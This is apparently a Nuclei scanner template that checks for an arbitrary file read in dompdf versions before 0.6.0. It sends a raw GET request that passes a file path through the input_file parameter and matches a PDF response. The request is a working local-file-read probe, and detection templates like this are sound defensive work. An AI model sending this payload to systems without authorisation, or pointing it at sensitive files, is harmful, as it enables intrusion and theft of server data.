id: arbitrary-file-read-in-dompdf1
info:
  author: 0x_Akoko
  name: Arbitrary file read in dompdf < v0.6.0
  reference: https://www.exploit-db.com/exploits/33004
  severity: high
  tags: dompdf,lfi
requests:
- matchers:
  - condition: and
    part: header
    type: word
    words:
    - application/pdf
    - filename="dompdf_out.pdf"
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "GET /dompdf.php?input_file=dompdf.php HTTP/1.1\nHost: {{Hostname}}\n        \
    \                \n"
